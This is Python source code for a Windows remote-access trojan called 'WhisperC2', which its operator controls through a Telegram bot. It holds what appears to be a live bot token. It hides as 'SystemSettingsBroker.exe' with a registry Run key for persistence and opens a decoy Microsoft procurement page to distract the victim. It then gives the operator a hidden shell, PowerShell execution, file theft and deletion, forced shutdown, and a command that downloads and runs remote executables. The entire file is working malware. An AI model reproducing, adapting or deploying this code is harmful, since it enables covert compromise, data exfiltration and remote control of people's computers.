#!/usr/bin/env python3
# =============================================================================
# WhisperC2 Professional – Production Ready (Reliable Shell + Multi-Agent)
# =============================================================================
import telebot, platform, subprocess, threading, time, os, sys, atexit, io, traceback, webbrowser
import shutil, winreg, ctypes, requests
from datetime import datetime
from pathlib import Path
from urllib.parse import urlparse
import random, string

# -----------------------------------------------------------------------------
# Configuration
# -----------------------------------------------------------------------------
BOT_API_KEY = "8229959913:AAFuLnQB33pstSVbc-g0VgkuVFHHhTh4Qac"
OPERATOR_CHAT_ID = 8269558111
GROUP_CHAT_ID = -1003919074770
DECOY_URL = "https://learn.microsoft.com/en-us/dynamics365/supply-chain/procurement/purchase-order-overview"

# -----------------------------------------------------------------------------
# Mutex & Logging
# -----------------------------------------------------------------------------
MUTEX_NAME = "Global\\WhisperPro_Mutex"
mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
if ctypes.windll.kernel32.GetLastError() == 183:
    sys.exit(0)
atexit.register(ctypes.windll.kernel32.CloseHandle, mutex)

log_lock = threading.Lock()
log_lines = []

def log(msg: str) -> None:
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with log_lock:
        log_lines.append({"time": timestamp, "msg": msg})
    print(f"* {msg}")

# -----------------------------------------------------------------------------
# Bot & Telemetry
# -----------------------------------------------------------------------------
bot = telebot.TeleBot(BOT_API_KEY)

def generate_telemetry_report(status: str) -> str:
    color = "#4CAF50" if status == "online" else "#F44336"
    emoji = "🟢" if status == "online" else "💀"
    rows = ""
    with log_lock:
        for entry in log_lines[-30:]:
            rows += f"<tr><td>{entry['time']}</td><td>{entry['msg']}</td></tr>"
    html = f"""<!DOCTYPE html><html><head><meta charset="UTF-8"><title>{SYSTEM_ID}</title>
<style>body{{background:#0d1117;color:#c9d1d9;font-family:Segoe UI}} .card{{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:20px;margin:20px auto;max-width:900px}}</style>
</head><body><div class="card"><h1>{emoji} {SYSTEM_ID} - {status.upper()}</h1><table>{rows or '<tr><td>No logs</td></tr>'}</table></div></body></html>"""
    return html

def send_telemetry(topic_id, status: str):
    if not topic_id: return
    try:
        bio = io.BytesIO(generate_telemetry_report(status).encode())
        bio.name = f"{SYSTEM_ID}_{status}.html"
        bot.send_document(GROUP_CHAT_ID, bio, message_thread_id=topic_id)
    except:
        try:
            bot.send_message(GROUP_CHAT_ID, f"{'🟢' if status=='online' else '💀'} **{SYSTEM_ID}** {status}", 
                           message_thread_id=topic_id)
        except: pass

# -----------------------------------------------------------------------------
# Agent Identity
# -----------------------------------------------------------------------------
appdata = os.environ.get('APPDATA', os.path.expanduser('~'))
agents_dir = os.path.join(appdata, 'Microsoft', 'Windows')
os.makedirs(agents_dir, exist_ok=True)

def get_system_id() -> str:
    hostname = subprocess.getstatusoutput("hostname")[1].strip().upper()
    raw_user = subprocess.getstatusoutput("whoami")[1].strip()
    username = raw_user.split('\\', 1)[1] if '\\' in raw_user else raw_user
    return f"{hostname}/{username}"

SYSTEM_ID = get_system_id()
HOSTNAME_PREFIX = SYSTEM_ID.split('/')[0]

TOPIC_ID_FILE = Path(agents_dir) / "topic_id.txt"

# -----------------------------------------------------------------------------
# Globals for Shell
# -----------------------------------------------------------------------------
shell_active = False
shell_process = None
_shell_topic_id = None
shell_lock = threading.Lock()

# -----------------------------------------------------------------------------
# Persistence & Topic
# -----------------------------------------------------------------------------
def get_or_create_topic():
    existing = None
    if TOPIC_ID_FILE.exists():
        try:
            existing = int(TOPIC_ID_FILE.read_text().strip())
            test = bot.send_message(GROUP_CHAT_ID, "🔍", message_thread_id=existing)
            bot.delete_message(GROUP_CHAT_ID, test.message_id)
            return existing
        except:
            pass
    try:
        new = bot.create_forum_topic(GROUP_CHAT_ID, SYSTEM_ID, icon_color=0x6FB9F0)
        tid = new.message_thread_id
        TOPIC_ID_FILE.write_text(str(tid))
        return tid
    except Exception as e:
        log(f"Topic creation failed: {e}")
        return None

def install_persistence():
    if not getattr(sys, 'frozen', False): return False
    try:
        dest = Path(agents_dir) / 'SystemSettingsBroker.exe'
        curr = Path(sys.executable)
        if curr.resolve() != dest.resolve() and not dest.exists():
            shutil.copy2(curr, dest)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "System Settings Broker", 0, winreg.REG_SZ, str(dest))
    except Exception as e:
        log(f"Persistence failed: {e}")

def self_destruct(topic_id):
    log("Self-destruct started")
    send_telemetry(topic_id, "offline")
    try:
        (Path(agents_dir) / 'SystemSettingsBroker.exe').unlink(missing_ok=True)
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
            winreg.DeleteValue(key, "System Settings Broker")
    except: pass
    try:
        ctypes.windll.kernel32.MoveFileExW(str(Path(sys.executable)), None, 0x4)
    except: pass

# -----------------------------------------------------------------------------
# Interactive Shell (Fixed & Reliable)
# -----------------------------------------------------------------------------
def spawn_shell(topic_id):
    global shell_active, shell_process, _shell_topic_id
    with shell_lock:
        if shell_active: return True
        _shell_topic_id = topic_id
        try:
            shell_process = subprocess.Popen("cmd.exe", stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                             stderr=subprocess.STDOUT, text=True, bufsize=0,
                                             creationflags=0x08000000)
            shell_active = True
            threading.Thread(target=shell_reader, daemon=True).start()
            log("Interactive shell started")
            return True
        except Exception as e:
            log(f"Shell spawn failed: {e}")
            return False

def shell_reader():
    global shell_active
    while shell_active and shell_process and shell_process.stdout:
        if shell_process.poll() is not None: break
        try:
            line = shell_process.stdout.readline()
            if not line: break
            safe = line.replace('```', "'''")
            for chunk in [safe[i:i+3900] for i in range(0, len(safe), 3900)]:
                try:
                    bot.send_message(GROUP_CHAT_ID, f"```\n{chunk}\n```",
                                   message_thread_id=_shell_topic_id, parse_mode='Markdown')
                    time.sleep(0.25)
                except: pass
        except: break
    kill_shell()

def kill_shell():
    global shell_active, shell_process
    shell_active = False
    if shell_process:
        try:
            shell_process.stdin.close()
            shell_process.terminate()
        except: pass

def write_shell(cmd: str):
    if shell_active and shell_process and shell_process.stdin:
        try:
            shell_process.stdin.write(cmd + "\n")
            shell_process.stdin.flush()
        except:
            kill_shell()

# -----------------------------------------------------------------------------
# Command Helpers
# -----------------------------------------------------------------------------
def sys_cmd(cmd: str) -> str:
    try: return subprocess.getstatusoutput(cmd)[1][:4000]
    except Exception as e: return f"Error: {e}"

def ps_cmd(cmd: str) -> str:
    try: return subprocess.getstatusoutput(f"powershell -Command {cmd}")[1][:4000]
    except Exception as e: return f"Error: {e}"

def view_file(path: str) -> str:
    try:
        if not os.path.exists(path): return "Not found"
        if os.path.isdir(path): return "Is a directory"
        if os.path.getsize(path) > 10*1024*1024: return "Too large"
        with open(path, 'r', errors='ignore') as f: return f.read()[:4000]
    except Exception as e: return f"Error: {e}"

def download_file_fs(path: str):
    try:
        if not os.path.exists(path): return None, "Not found"
        if os.path.isdir(path): return None, "Is a directory"
        if os.path.getsize(path) > 50*1024*1024: return None, "Too large"
        return path, None
    except: return None, "Error"

def dex(arg_line: str):
    if not arg_line: return "Usage: dex <url> [args...]"
    parts = arg_line.split(maxsplit=1)
    url, extra = parts[0], (parts[1].split() if len(parts)>1 else [])
    p = urlparse(url)
    if p.scheme not in ('http','https'): return "Invalid scheme"
    name = ''.join(random.choices(string.ascii_letters+string.digits, k=8)) + (os.path.splitext(p.path)[1] or ".exe")
    dest = os.path.join(os.environ.get('TEMP','.'), name)
    try:
        r = requests.get(url, stream=True, timeout=30)
        r.raise_for_status()
        with open(dest, 'wb') as f:
            for chunk in r.iter_content(8192): f.write(chunk) if chunk else None
    except Exception as e: return f"Download failed: {e}"
    try:
        proc = subprocess.Popen([dest, *extra], stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                text=True, creationflags=0x08000000)
        out, err = proc.communicate(timeout=30)
        return f"Executed: {dest}\nExit: {proc.returncode}\n{(out+err).strip() or '[No output]'}"
    except Exception as e: return f"Execution error: {e}"
    finally:
        try: ctypes.windll.kernel32.MoveFileExW(dest, None, 0x4)
        except: pass

# -----------------------------------------------------------------------------
# Command Dispatcher
# -----------------------------------------------------------------------------
def execute_command(cmd_line: str, topic_id):
    parts = cmd_line.strip().split(' ', 1)
    cmd = parts[0].lower()
    args = parts[1] if len(parts) > 1 else ""

    if cmd in ("ping", "start", "scan"):
        return f"🟢 {SYSTEM_ID} online\n{platform.system()} {platform.release()}", None
    elif cmd == "shell":
        if args: return sys_cmd(args).replace('```',"'''"), None
        return ("💬 Interactive shell started. Type `exit` to close.", None) if spawn_shell(topic_id) else ("❌ Failed to spawn shell.", None)
    elif cmd in ("powershell", "pow"):
        if not args: return "Usage: powershell <command>", None
        return ps_cmd(args).replace('```',"'''"), None
    elif cmd in ("download", "downloadfile"):
        path, err = download_file_fs(args.strip())
        return (err or f"⬆️ Uploading {args.strip()}", path)
    elif cmd == "delete":
        try: os.remove(args.strip()); return f"🗑️ Deleted: {args.strip()}", None
        except Exception as e: return f"❌ Delete failed: {e}", None
    elif cmd in ("view", "viewfile"):
        return view_file(args.strip()).replace('```',"'''"), None
    elif cmd == "dex":
        return dex(args).replace('```',"'''"), None
    elif cmd == "die":
        self_destruct(topic_id)
        return "💀 Shutting down...", None
    elif cmd == "off":
        subprocess.run(["shutdown","/s","/t","0","/f"], check=False)
        return "🔌 Shutting down PC...", None
    return f"❓ Unknown command: {cmd}", None

# -----------------------------------------------------------------------------
# Message Handler (Fixed Shell Logic)
# -----------------------------------------------------------------------------
def main():
    log("Agent starting")
    install_persistence()

    topic_id = None
    for _ in range(3):
        topic_id = get_or_create_topic()
        if topic_id: break
        time.sleep(2)

    if not topic_id:
        log("Falling back to main group with prefix filter")
        topic_id = None

    log(f"Agent ready → {SYSTEM_ID} | Topic: {topic_id or 'MAIN (filtered)'}")

    def handler_wrapper(message):
        if message.from_user.id != OPERATOR_CHAT_ID or message.from_user.is_bot:
            return

        if topic_id is not None:
            if getattr(message, 'message_thread_id', None) != topic_id:
                return
        elif not message.text or HOSTNAME_PREFIX not in message.text:
            return

        text = (message.text or "").strip()
        if not text: return

        # === INTERACTIVE SHELL MODE ===
        if shell_active:
            clean = text[1:] if text.startswith('/') else text
            if clean.lower() == "exit":
                kill_shell()
                bot.reply_to(message, "💬 Shell closed.", message_thread_id=topic_id)
            elif clean.lower().startswith("die"):
                kill_shell()
                execute_command("die", topic_id)
            else:
                write_shell(clean)
            return

        # === NORMAL COMMAND MODE ===
        if text.startswith('/'):
            text = text[1:].strip()

        response, file_path = execute_command(text, topic_id)
        reply_kwargs = {'message_thread_id': topic_id} if topic_id else {}

        if text.lower().startswith("die"):
            bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
            sys.exit(0)

        try:
            bot.reply_to(message, f"```\n{response}\n```", parse_mode='Markdown', **reply_kwargs)
        except:
            bot.reply_to(message, response, **reply_kwargs)

        if file_path and os.path.exists(file_path):
            try:
                with open(file_path, 'rb') as f:
                    bot.send_document(message.chat.id, f, message_thread_id=topic_id)
            except Exception as e:
                log(f"File send error: {e}")
            finally:
                try: os.remove(file_path)
                except: pass

    @bot.message_handler(chat_types=['supergroup'], func=lambda m: bool(m.text))
    def handler(msg):
        handler_wrapper(msg)

    threading.Thread(target=webbrowser.open, args=(DECOY_URL,), daemon=True).start()
    send_telemetry(topic_id, "online")

    log("Polling started...")
    bot.infinity_polling(timeout=30, long_polling_timeout=30)

if __name__ == "__main__":
    main()
